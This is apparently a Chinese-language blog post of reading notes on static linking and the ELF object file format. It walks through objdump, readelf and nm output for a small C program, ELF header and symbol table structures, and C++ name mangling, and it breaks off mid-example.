这类文件包含了代码和数据，可以被用来链接成可执行文件或共享目标文件。静态链接库也归为这一类 Linux 的.o，Windows的.obj 可执行文件 (Executable File) 这类文件包含了可以直接执行的程序 Windows下的.exe，Linux下/bin/bash文件 共享目标文件 (Shared Object File) 这类文件包含了代码和数据，可以在两种情况下使用。一种是链接器可以使用这种文件跟其他可重定位文件和共享目标文件链接，产生新的目标文件。第二种是动态链接器可以将几个这种共享目标文件与可执行文件结合，作为进程映像的一部分来允许 Linux的.so比如/usr/lib/libc.so，Windows下的DLL 核心转储文件 (Core Dump File) 当进程意外终止时，系统可以将该进程的地址空间的内容及终止时的一些其他信息转储到核心转储文件 linux下的core dump Linux下使用file命令可以查看相应的文件格式 $ file \u003cfilename\u003e ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:4:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"目标文件的内容 目标文件按照包含信息的不同属性，以节的形式存储，有时候也叫段。一般情况下它们都表示一个定长的区域不做区别，唯一的区别就是在ELF的链接视图和装载视图的时候。 程序源代码编译后的机器指令被放在代码段里，代码段的名字有.code和.text，已初始化的全局变量和局部静态变量放在数据段.data中，未初始化的全局变量和局部静态变量或者初始化却为0的放在BSS段.bss ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:5:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"浅析目标文件 使用objdump工具可以查看目标文件的内部结构 $ objdump -h \u003cfilename\u003e 参数-h是把ELF各个段的基本信息打印出来，可以使用-x打印更多的信息。 $ objdump -s -d \u003cfilename\u003e -s是将所有段的内容以十六进制的方式打印出来，-d可以将包含指令的段反汇编。 //Hello.c: #include\u003cstdio.h\u003e void fun1(); int gloabl_init_var = 666; int global_uninit_var; int main(void){ static int static_init_var = 999; static int static_uninit_var; int a = 1; int b; printf(\"Hello\\n\"); fun1(); return 0; } void fun1(){} 使用gcc编译但不链接 $ gcc -c Hello.c 使用objdump查看object内部结构 $ objdump -h Hello.o Hello.o: file format elf64-x86-64 Sections: Idx Name Size VMA LMA File off Algn 0 .text 00000036 0000000000000000 0000000000000000 00000040 2**0 CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE 1 .data 00000008 0000000000000000 0000000000000000 00000078 2**2 CONTENTS, ALLOC, LOAD, DATA 2 .bss 00000008 0000000000000000 0000000000000000 00000080 2**2 ALLOC 3 .rodata 00000006 0000000000000000 0000000000000000 00000080 2**0 CONTENTS, ALLOC, LOAD, READONLY, DATA 4 .comment 0000001c 0000000000000000 0000000000000000 00000086 2**0 CONTENTS, READONLY 5 .note.GNU-stack 00000000 0000000000000000 0000000000000000 000000a2 2**0 CONTENTS, READONLY 6 .note.gnu.property 00000030 0000000000000000 0000000000000000 000000a8 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 7 .eh_frame 00000058 0000000000000000 0000000000000000 000000d8 2**3 CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA -h是把ELF文件各个段的基本信息打印出来，-x可以打印出更多的信息。 除了代码段、数据段和BSS段之外，还有只读数据段(.rodata)、注释信息段(.comment)和堆栈提示段(.note.GNU-stack)。 这里的Size就是段的长度，File off(offset)是段所在的位置。每个段的第二行中CONTENTS、ALLOC等表示段的属性，前者表示该段在文件中存在。可以看到BSS段并不是CONTENTS，表示其实际上在ELF文件中不存在内容。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:6:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"代码段 $objdump -s -d Hello.o Hello.o: file format elf64-x86-64 Contents of section .text: 0000 554889e5 4883ec10 c745fc01 00000048 UH..H....E.....H 0010 8d050000 00004889 c7e80000 0000b800 ......H......... 0020 000000e8 00000000 b8000000 00c9c355 ...............U 0030 4889e590 5dc3 H...]. Contents of section .data: 0000 9a020000 e7030000 ........ Contents of section .rodata: 0000 48656c6c 6f00 Hello. Contents of section .comment: 0000 00474343 3a202847 4e552920 31322e32 .GCC: (GNU) 12.2 0010 2e312032 30323330 31313100 .1 20230111. Contents of section .note.gnu.property: 0000 04000000 20000000 05000000 474e5500 .... .......GNU. 0010 020001c0 04000000 00000000 00000000 ................ 0020 010001c0 04000000 01000000 00000000 ................ Contents of section .eh_frame: 0000 14000000 00000000 017a5200 01781001 .........zR..x.. 0010 1b0c0708 90010000 1c000000 1c000000 ................ 0020 00000000 2f000000 00410e10 8602430d ..../....A....C. 0030 066a0c07 08000000 1c000000 3c000000 .j..........\u003c... 0040 00000000 07000000 00410e10 8602430d .........A....C. 0050 06420c07 08000000 .B...... Disassembly of section .text: 0000000000000000 \u003cmain\u003e: 0: 55 push %rbp 1: 48 89 e5 mov %rsp,%rbp 4: 48 83 ec 10 sub $0x10,%rsp 8: c7 45 fc 01 00 00 00 movl $0x1,-0x4(%rbp) f: 48 8d 05 00 00 00 00 lea 0x0(%rip),%rax # 16 \u003cmain+0x16\u003e 16: 48 89 c7 mov %rax,%rdi 19: e8 00 00 00 00 call 1e \u003cmain+0x1e\u003e 1e: b8 00 00 00 00 mov $0x0,%eax 23: e8 00 00 00 00 call 28 \u003cmain+0x28\u003e 28: b8 00 00 00 00 mov $0x0,%eax 2d: c9 leave 2e: c3 ret 000000000000002f \u003cfun1\u003e: 2f: 55 push %rbp 30: 48 89 e5 mov %rsp,%rbp 33: 90 nop 34: 5d pop %rbp 35: c3 ret “Contents of setion .text\"是将.text的数据以十六进制方式打印出来的内容,总共0x2b字节，和之前用objdump打印的.text段的长度一致。最左边的是偏移量，中间四列是十六进制内容，最右边是.text段的ASCII码形式。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:6:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"数据段和只读数据段 .data保存了已经初始化的全局变量和局部静态变量。Hello.c文件中有两个这样的变量（global_init_var和static_init_var），每个变量4字节，所以.data段大小8字节。 Contents of section .data: 0000 9a020000 e7030000 ........ 上面关于.data段的内容中，前四个字节分别是0x9a、0x02、0x00、0x00。这个值对应gloabl_init_var，即十进制的666，但其存放的顺序是倒序的，而不是正常666的十六进制表示0x029a。这涉及到字节序的问题。 .rodata存放只读数据，一般是程序的只读变量(const修饰)和字符串常量。Hello.c中 printf(\"Hello\\n\");用到了字符串常量Hello\\n，这只是一种只读数据，所以被放在了.rodata段。 有时候编译器会把字符串常量放在.data段。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:6:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"BSS段 .bss段存放未初始化的全局变量和局部静态变量，准确的说法是.bss段为它们预留了空间。 通过符号表可以看到未初始化的全局变量和局部静态变量都不全部放在了.bss段，这和不同的语言和编译器的实现有关，有的编译器会将全局未初始化变量存放在.bss段，有的不会，只会预留一个未定义的全局变量符号，等最后链接成可执行文件的时候再加上.bss段分配空间。 一个变量被初始化为0也会被放在.bss段，这是优化的结果。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:6:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"其他段 除了.text .data .bss三个最常用的段之外，ELF文件可能包含其他的段用来保存和程序相关的信息。 常用的段名 说明 .rodatal Read Only Data，存储只读数据，比如字符串常量、全局const变量，和.rodata段一样 .comment 存放了编译器的版本信息 .debug 调试信息 .dynamic 动态链接信息 .hash 符号哈希表 .line 调试用到的行号表，即源代码行号和编译后的指令的对应表 .note 额外的编译信息，比如程序的公司名，版本号 .strtab String Tab，字符串表，存储ELF文件中用到的各种字符串 .symtab Symbol Tab，符号表 .shstrtab Section String Tbale，段名表 .plt / .got 动态链接的跳转表和 全局入口表 .init / .fini 程序的初始化和终结代码段 这些段的名字都有.作前缀，表明这些表的名字是系统保留的，应用程序可以使用一些非系统保留的名字作为段名，但不可以.作为前缀。ELF允许有多个重复名字的段。还有一些段的名字是因为ELF的历史遗留问题造成，如 .sdata .tdesc .sbcc .lit4 .lit8 .reginfo .gptab .liblist .conflict 上述段名已经被遗弃了。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:6:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"自定义段 GCC提供了一种扩展机制可以让开发者指定变量所处的段 __attribute__((section(\"\u003cname\u003e\"))) 上述语句后面接一个函数或变量定义的语句即可，就可以指定保存的段名，如： __attribute__((section(\"FOO\"))) int global = 42; ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:6:5","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"ELF文件结构描述 ELF目标文件格式最前部的是ELF文件头（ELF Header），它包含了描述整个文件的基本属性。紧接着是ELF文件各个段，与段有关的重要结构就是段表（Section Header Table），它描述了ELF文件包含的段的信息。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:7:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"文件头 使用readelf可以详细查看ELF文件 readelf -h Hello.o ELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: REL (Relocatable file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x0 Start of program headers: 0 (bytes into file) Start of section headers: 904 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 0 (bytes) Number of program headers: 0 Size of section headers: 64 (bytes) Number of section headers: 14 Section header string table index: 13 ELF文件结构及其相关常数定义在/usr/include/elf.h里，ELF有32位和64位两个版本，自然对应Elf32_Ehdr和Elf64_Ehdr两个结构。elf.h使用typedef定义了一套自己的变量体系。 /* Type for a 16-bit quantity. */ typedef uint16_t Elf32_Half; typedef uint16_t Elf64_Half; /* Types for signed and unsigned 32-bit quantities. */ typedef uint32_t Elf32_Word; typedef int32_t Elf32_Sword; typedef uint32_t Elf64_Word; typedef int32_t Elf64_Sword; /* Types for signed and unsigned 64-bit quantities. */ typedef uint64_t Elf32_Xword; typedef int64_t Elf32_Sxword; typedef uint64_t Elf64_Xword; typedef int64_t Elf64_Sxword; /* Type of addresses. */ typedef uint32_t Elf32_Addr; typedef uint64_t Elf64_Addr; /* Type of file offsets. */ typedef uint32_t Elf32_Off; typedef uint64_t Elf64_Off; /* Type for section indices, which are 16-bit quantities. */ typedef uint16_t Elf32_Section; typedef uint16_t Elf64_Section; /* Type for version symbol information. */ typedef Elf32_Half Elf32_Versym; typedef Elf64_Half Elf64_Versym; 以Elf64_Ehdr为例： #define EI_NIDENT (16) typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf64_Half e_type; /* Object file type */ Elf64_Half e_machine; /* Architecture */ Elf64_Word e_version; /* Object file version */ Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; /* Processor-specific flags */ Elf64_Half e_ehsize; /* ELF header size in bytes */ Elf64_Half e_phentsize; /* Program header table entry size */ Elf64_Half e_phnum; /* Program header table entry count */ Elf64_Half e_shentsize; /* Section header table entry size */ Elf64_Half e_shnum; /* Section header table entry count */ Elf64_Half e_shstrndx; /* Section header string table index */ } Elf64_Ehdr; ELF文件头结构成员含义 成员 readelf输出结果和含义 e_ident Magic、Class、Data、Version、OS/ABI、ABI Version e_type Type，ELF文件类型 e_machine ELF文件件的CPU平台属性 e_version ELF版本号，一般为1 e_entry Entry point address，入口地址，可重定位文件一般没有入口地址，则这个值为0 e_phoff Start of program headers e_shoff Start of section headers，段表在文件中的偏移 e_word Flags，ELF标志位，标识一些ELF文件平台相关的属性 e_ehsize Size of this header，ELF文件头本身大小 e_phentsize Size of program headers e_phnum Number of program headers e_shentsize Size of section headers，段表描述符的大小 e_shnum Number of Section headers，段表描述符数量，等于该ELF文件中段的数量 e_shstrndx Section header string table index，段表字符串表所在的段在段表中的下标 ELFmagic number 使用readelf最前面打印的Magic被ELF标准规定标识ELF平台的属性。 最开始的4字节是所有ELF文件都相同的标识码：0x7f、0x45、0x4c、0x46，第一个对应ASCII的del控制符。侯三字节对应elf三个字母的ASCII码。几乎所有可执行文件格式的最开始几个字节都是magic number，a.out是0x01、0x07，PE/COFF是0x4d、0x5a。Magic number可以用来确认文件的类型，操作系统加载可执行文件时检查magic number是否正确以决定是否记载。 接下来的一个字节用来表示ELF文件类的，0x01是32位、0x02是64位。 第6个字节是字节序，规定ELF文件时大端还是小端的。 第七个规定ELF文件的主版本号。 后9个无特别要求，有的平台将其作为扩展标志。 文件类型 e_type表示ELF文件类型 常量 值 含义 ET_REL 1 可重定位文件，后缀.o ET_EXEC 2 可执行文件 ET_DYN 3 共享目标文件，后缀.so 机器类型 e_machine表示ELF文件的平台属性 ELF文件格式被设计在多个平台使用。这不表示同一个文件在不同的平台上都能使用，而是表示不同的平台遵循同一个标准。 常量 值 含义 EM_M32 1 AT\u0026T WE 32100 EM_SPARC 2 SPARC EM_386 3 Intel x86 EM_68K 4 Motorola 68000 EM_88K 5 Motorola 88000 EM_860 6 Intel 80860 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:7:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"段表 objdump -h只会列出关键的段，readelf还能看到辅助性的段 $ readelf -S Hello.o There are 14 section headers, starting at offset 0x388: Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .text PROGBITS 0000000000000000 00000040 0000000000000036 0000000000000000 AX 0 0 1 [ 2] .rela.text RELA 0000000000000000 00000298 0000000000000048 0000000000000018 I 11 1 8 [ 3] .data PROGBITS 0000000000000000 00000078 0000000000000008 0000000000000000 WA 0 0 4 [ 4] .bss NOBITS 0000000000000000 00000080 0000000000000008 0000000000000000 WA 0 0 4 [ 5] .rodata PROGBITS 0000000000000000 00000080 0000000000000006 0000000000000000 A 0 0 1 [ 6] .comment PROGBITS 0000000000000000 00000086 000000000000001c 0000000000000001 MS 0 0 1 [ 7] .note.GNU-stack PROGBITS 0000000000000000 000000a2 0000000000000000 0000000000000000 0 0 1 [ 8] .note.gnu.pr[...] NOTE 0000000000000000 000000a8 0000000000000030 0000000000000000 A 0 0 8 [ 9] .eh_frame PROGBITS 0000000000000000 000000d8 0000000000000058 0000000000000000 A 0 0 8 [10] .rela.eh_frame RELA 0000000000000000 000002e0 0000000000000030 0000000000000018 I 11 9 8 [11] .symtab SYMTAB 0000000000000000 00000130 0000000000000108 0000000000000018 12 6 8 [12] .strtab STRTAB 0000000000000000 00000238 0000000000000060 0000000000000000 0 0 1 [13] .shstrtab STRTAB 0000000000000000 00000310 0000000000000074 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), D (mbind), l (large), p (processor specific) 查看其输出发现段表是一个以Elf64_Shdr结构体为元素的数组，数组元素的个数即段的个数，Elf64_Shdr也被称为段描述符（Section Descriptor）。 Elf64_Shdr被定义在/usr/include/elf.h， typedef struct { Elf64_Word sh_name; /* Section name (string tbl index) */ Elf64_Word sh_type; /* Section type */ Elf64_Xword sh_flags; /* Section flags */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Section size in bytes */ Elf64_Word sh_link; /* Link to another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */ } Elf64_Shdr; 其成员含义如下： 变量 含义 sh_name 段名 sh_type 段的类型 sh_flags 段的标志位 sh_addr 段虚拟地址 sh_offset 段偏移 sh_size 段的长度 sh_link和sh_info 段的链接信息 sh_addralign 有些段对段地址有对齐要求，它表示的就是地址对齐数量中的指数，如果值为3就表明对齐是$2^3$=8倍，如果为0或1则表明没有这种需求 sh_entsize 项的长度 段名是个字符串，它位于一个叫做.shstrtab的字符串表。sh_name是段名字符串在这个表中的偏移。 段的名字对编译器和链接器来说是有意义的，但对操作系统来说没啥意义。对操作系统来说，一个段如何处理取决于其属性和权限。 段的类型 对于编译器和链接器来说，主要决定段的属性的是段的类型（sh_type)和段的标志位（sh_flags)。 常量 值 含义 SHT_NULL 0 无效段 SHT_PROGBITS 1 程序段、代码段、数据段皆是此类型 SHT_SYMTAB 2 表示该段的内容为符号表 SHT_STRTAB 3 表示该段的内容是字符串表 SHT_RELA 4 重定位表 SHT_HASH 5 符号表的哈希表 SHT_DYNAMIC 6 动态链接信息 SHT_NOTE 7 提示性信息 SHT_NOBITS 8 表示该段在文件中无内容，如.bss段 SHT_REL 9 该段包含可重定位信息 SHT_SHLIB 10 保留 SHT_DNYSYM 11 动态链接的符号表 段的标志位 段的标志位表示该段在虚拟地址空间中的属性。 常量 值 含义 SHT_WRITE 1 可写 SHT_ALLOC 2 表示该段需要在进程空间分配空间，有些含有指示或控制信息的段不需要在进程空间中分配空间，就不会有这个标志。代码段数据段会有这个标志 SHT_EXECINSTR 4 可执行 段的链接信息 如果段的类型和链接相关，sh_link和sh_info两个成员所包含的意义如下，对于其他类型的段，二者无意义。 sh_type sh_link sh_info SHT_DYNAMIC 该段使用的字符串表在段表中的下标 0 SHT_HASH 该段使用的符号表在段表中的下标 0 SHT_REL 该段使用的相应符号表在段表中的下标 该重定位表所作用的段在段表中的下标 SHT_RELA 同上 同上 SHT_SYMTAB 操作系统相关 操作系统相关 SHT_DYNAYM 同上 同上 other SHN_UNDEF 0 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:7:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"重定位表 Hello.o有一个叫做.rel.text的段，它的类型是RELA，即它是一个重定位表。 对于每个需要重定位的代码段和数据段，都会有一个相应的重定位表。比如Hello.o中就存在对printf()函数的调用。 重定位表同时也是ELF文件的一个段，段的类型(sh_type)就是SHT_RELA，sh_link表示该符号的下标，sh_info表示其作用在哪个段。比如.rel.text作用于.text段，.text段的下表是 1 ，那么.rel.text的.sh_info就为1。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:7:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"字符串表 ELF文件中的字符串长度并不固定（段名、变量名等），无法用固定的结构表示它们，故而把字符串集中存放到一个表，然后使用字符串在表中的偏移引用字符串。 偏移 +0 +1 +2 +3 +4 +5 +6 +7 +8 +9 +0 \\0 h e l l o w o r l +10 d \\0 M y v a r i a b +20 l e \\0 它的偏移与之对应的字符串如下表 偏移 字符串 0 空字符串 1 helloworld 6 world 12 Myvariable 一般字符串表以段的形式保存，.strtab是字符串表，.shstrtab是段表字符串表。顾名思义，字符串表保存普通的字符串，段表字符串表保存段表中用到的字符串，比如段名。 之前readelf -h中得到了e_shstrndx的值为13，而readelf -S可以看到，shstrtab这个段正好位于段表中下标13的位置。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:7:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"符号 链接中，函数和变量被称为符号，函数名和变量名被称为符号名 每一个目标文件都会有一个相应的符号表，每个定义的符号都会有一个对应的值（符号值），对于函数和变量来说，这个值就是它们的地址。 符号总共分为以下几类： 定义在本目标文件的全局符号，可以被其他目标文件引用 比如Hello.o中的main、fun1()和global_init_var 在本目标文件引用却未定义的全局符号，一般叫外部符号 比如Hello.o中的printf 段名，这种符号由编译器产生，值就是段的起始地址 比如Hello.o中的.text、.data等 局部符号，编译单元内部可见。调试器使用这些符号分析程序或崩溃时的核心转储文件。于链接无用，被链接器忽视 行号信息，目标文件指令和源代码行的对应关系，可选 查看ELF的符号表有很多工具，readelf、objdump、nm等，以nm为例： $ nm Hello.o 000000000000002f T fun1 0000000000000000 D gloabl_init_var 0000000000000000 B global_uninit_var 0000000000000000 T main U puts 0000000000000004 d static_init_var.0 0000000000000004 b static_uninit_var.1 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:8:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"ELF符号表结构 符号表往往是文件中的一个段，名字叫.symtab，符号表结构是Elf64_Sym结构的数组，每个Elf64_Sym结构对应一个符号 typedef struct { Elf64_Word st_name; /* Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* Section index */ Elf64_Addr st_value; /* Symbol value */ Elf64_Xword st_size; /* Symbol size */ } Elf64_Sym; 成员 含义 st_name 符号名，该成员包含该符号名在字符串表的下标 st_value 符号对应的值。值与符号有关，可能是绝对值，也可能是个地址 st_size 符号大小。对于包含数据的符号来说，值是该数据类型的大小，比如double的符号就是8。如果值是0，则表示该符号大小为0或未知 st_info 符号类型和绑定信息 st_other 符号的可见性 st_shndx 符号所在的段 符号类型和绑定信息 低4位表示符号类型，高28位表示符号绑定信息 符号绑定信息： 宏定义名 值 说明 STB_LOCAL 0 局部符号，低目标文件外部不可见 STB_GLOBAL 1 全局符号，外部可见 STB_WEAK 2 弱引用 符号类型： 宏定义名 值 说明 STT_NOTYPE 0 未知类型符号 STT_OBJECT 1 数据对象，如变量、数组 STT_FUNC 2 函数或其他可执行代码 STT_SECTION 3 段，这个符号必须是STB_LOCAL的 STT_FILE 4 文件名，一般指的是该目标文件所对应的源文件名，它一定是STB_LOCAL的，st_shndx一定是SHN_ABS 符号所在段 st_shndx，如果符号定义在本目标文件中，该成员的表示符号所在的表在段表中的下标，如果不在或者对于一些特殊符号，其值也会特殊些，具体如下： 宏定义名 值 说明 SHN_ABS 0xfff1 该符号包含一个绝对的值 SHN_COMMON 0xfff2 该符号是一个COMMON类型的符号，一般来说未初始化的全局符号定义就是这是类型 SHN_UNDEF 0 该符号未定义，即引用未定义 符号值 在目标文件中，如果是该符号的定义并且该符号不是COMMON块类型的，则st_value表示该符号在段中的偏移。 即符号所对应的函数或变量位于由st_shndx指定的段，偏移st_value的位置。 在目标文件中，如果符号是COMMON块类型，st_value表示该符号的对齐属性 在可执行文件中，st_value表示该符号的虚拟地址 以Hello.o为例 $ readelf -s Hello.o Symbol table '.symtab' contains 11 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FILE LOCAL DEFAULT ABS Hello.c 2: 0000000000000000 0 SECTION LOCAL DEFAULT 1 .text 3: 0000000000000000 0 SECTION LOCAL DEFAULT 5 .rodata 4: 0000000000000004 4 OBJECT LOCAL DEFAULT 4 static_uninit_var.1 5: 0000000000000004 4 OBJECT LOCAL DEFAULT 3 static_init_var.0 6: 0000000000000000 4 OBJECT GLOBAL DEFAULT 3 gloabl_init_var 7: 0000000000000000 4 OBJECT GLOBAL DEFAULT 4 global_uninit_var 8: 0000000000000000 47 FUNC GLOBAL DEFAULT 1 main 9: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND puts 10: 000000000000002f 7 FUNC GLOBAL DEFAULT 1 fun1 readelf输出和Elf64_Sym的各个成员几乎一一对应。 第一列Num表示符号表数组的下标，第二列Value就是符号值，第三列Size表示符号大小，第四列和第五列表示符号类型和绑定信息，第六列表示其可见性，第七列Ndx表示符号所属的段，最后一列是符号名称。 fun1()和main()函数都是定义在Hello.c里的，它们都处于代码段，所以Ndx值是1，即Hello.o中，.text段的下标是1。它俩是函数，所以类型是FUNC，它们是全局可见，所以是GLOBAL，Size表示函数指令所占的字节数，Value表示函数相对于代码段起始位置的偏移量 prindf()函数在Hello.c中被引用无定义，所以Ndx是UND global_init_var是已初始化的全局变量，被定义在.bss段，即下标为3 static前缀的两个局部变量的绑定属性是LOCAL，即编译单元内部可见。Name不是源文件中的名称在符号修饰中可以解释 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:8:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"特殊符号 使用ld作为链接器来链接生产可执行文件时，它会定义很多特殊符号，这些符号没有在程序中定义却可以直接声明并引用它，这就是特殊符号。只有使用ld链接器生成最终可执行文件的时候这些文件才存在。下面列举几个有代表性的特殊符号： __executable_start，程序起始地址，这不是入口地址，是程序最开始的地址 __etext或_etext或etext，代码段结束地址 _edata或edata，数据段结束地址 _end或end，程序结束地址 以上地址都是程序被装载时的虚拟地址。 在程序中可以直接使用这些符号。 #include \u003cstdio.h\u003e extern char __executable__start[]; extern char etext[], _etext[], __etext[]; extern char edata[], _edata[]; extern char end[], _end[]; int main(void){ printf(\"Executable Start %X\\n\", __executable__start); printf(\"Text End %X %X %X\\n\", etext, _etext, __etext); printf(\"Data End %X %X\\n\", edata, _edata); printf(\"Executable End %X %X\\n\", end, _end); return 0; } ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:8:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"符号修饰和函数签名 早期符号和与之对应的函数名或变量名是一致的，就容易造成符号冲突问题，Unix下C语言规定全局的变量和函数经过编译后，相对应的符号名前加_暂缓这个问题，后来像C++这样的语言有命名空间这样的方法解决这个问题。 Linux下的GCC编译器已经默认不加_了，Windows平台下的依然保留。 为了支持C++函数重载、名称空间这样的机制，使得编译器和链接器能够区分重载的函数，就有了符号修饰或符号改编。例如下面的例子： int func(int); float func(float); class C { int func(int); class C2 { int func(int); }; }; namespace N { int func(int); class C { int func(int); }; } 上述函数有6个同名函数，不过返回类型和参数以及所在的类和名称空间有所不同。 这就靠函数签名，函数签名包含了一个函数的信息（函数名、参数类型、所在的类和名称空间等）。编译器和链接器处理符号的时候，它们使用名称修饰的方法使得每个函数签名对应一个修饰后名称。上述6个函数签名在GCC编译器下产生的修饰后名称如下： 函数签名 修饰后名称（符号名） int func(int) _Z4funci float func(float) _Z4funcf int C::func(int) _ZN1C4funcEi int C::C2::fun(int) _ZN1C2C24funcEi int N::func(int) _AN1N4funcEi int N::C::func(int) _ZN1N1C4funcEi GCC的基本C++名称修饰方法如下： 所有的符号以_Z开头，对于嵌套的名字（名称空间或类）后面紧跟N，然后是名称空间和类的名字，名字前面的是名字字符串长度，以E为结尾，对于函数来说，参数列表紧跟在E后面。 c++filt可以解析被修饰过的名称： $ c++filt _ZN1N1C4funcEi N::C::func(int) 全局变量和局部静态变量依旧有签名和名称修饰的机制，不过变量的类型没有加入修饰后名称中。 不同的编译器采用不同的名称修饰的方法，这是不同的编译器之间难以相互操作的主要原因之一。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:8:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"extern “C” C++提供了extern关键字用来声明或定义一个C语言的符号： extern \"C\" { int func(int); int var; } extern \"C\" int suc; 上述声明和定义的函数和变量就不会受到C++名称修饰的作用。 C++无法链接C语言的库函数，因为C++对函数进行了名称修饰，但C语言没有。使用C++宏__cplusplus可以解决这个问题 #ifdef __cplusplus extern \"C\"{ #enddef \u003cfuncation detail\u003e #ifdef __cplusplus } #enddef 如果当前编译单元是C++代码，函数会在extern \"C\"里面被声明，如果C代码则是直接声明。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:8:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"弱符号和强符号 C/C++中，编译器默认函数和初始化的全局变量为强符号，未初始化的全局变量为弱符号，也可以通过GCC的__attribute__((weak))定义任何一个强符号为弱符号。 针对强弱符号，链接器按以下规则处理： 不允许强符号被多次定义，不同的目标文件不能有同名的强符号。 如果一个符号在一个目标文件中是强符号，在其他文件中都是弱符号，那么就选择强符号 如果一个符号在所有目标文件中都是弱符号，那么选择占用空间最大的一个，比如A中定义了int的a，B中有个long的a，那么链接后符号a就是占8字节了 强引用和弱引用 对外部目标文件的符号引用在目标屋内按最终链接成可执行文件时，他们就要被正确决议，如果没找到符号的定义，链接器就要报错。 上述过程导致报错的情况就是强引用导致的，弱引用就算未定义也不会报错。链接器默认其为0或是一个特殊的值 GCC中，可以通过attribute((weakref))这个扩展关键字声明一个外部函数的引用为弱引用。 弱符号和弱引用对于库来说有用，库中定义的弱符号可以被用户定义的强符号所覆盖，比如程序的某些扩展功能是弱引用，就算去掉了扩展功能也可以正常链接，只是缺少了相应的功能。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:8:5","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"调试信息 GCC编译时加上-g参数就可以在产生的文件中加上调试信息，使用readelf等工具可以看到多了个.debug相关的段 Linux下，使用strip命令可以去掉ELF文件中的调试信息 静态链接 以下面两个源文件进行举例说明： /* a.c */ extern int shared; int main(){ int a = 100; swap(\u0026a, \u0026shared); } /* b.c */ int shared = 1; void swap(int* a, int* b){ *a ^= *b ^= *a ^= 